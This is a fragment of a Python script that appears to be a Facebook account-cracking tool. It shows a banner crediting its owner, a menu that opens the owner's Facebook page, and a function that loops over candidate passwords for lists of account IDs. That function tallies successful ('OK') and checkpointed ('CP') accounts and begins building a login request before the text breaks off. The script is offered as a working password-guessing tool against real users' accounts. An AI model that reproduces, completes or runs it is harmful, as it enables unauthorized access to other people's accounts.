...
logo =f"""{A}
 ...
 {G1}  #    #  #   #  #   #  #####  ####
{A}──────────────────────────────────────────────────
{G1}[{A}={G1}]{G1} OWNER    {A}:{G1} MUHAMMAD RAKIB HASAN
{G1}[{A}={G2}]{G2} FACEBOOK {A}:{G2} MUHAMMAD RAKIB HASAN
...
def menu():   
    ...
    if select =='1':
        ...
        os.system('xdg-open https://www.facebook.com/MD.RAKIB.0FFICIAL5880');menu()
    elif select =='0':
...
def randm(ids,psd):
    global loop,ok,cp
    sys.stdout.write(f"\r{G1}[{A}RAKIB-143{G1}]{A}-{G1}[{A}{loop}{G1}]{A}-{G1}[{A}OK{G1}/{A}CP{G1}]{A}-{G1}[{A}{len(ok)}{G1}/{A}{len(cp)}{G1}] ")
    sys.stdout.flush()
    try:
        for pas in psd:
            data={'adid':str(uuid.uuid4()),
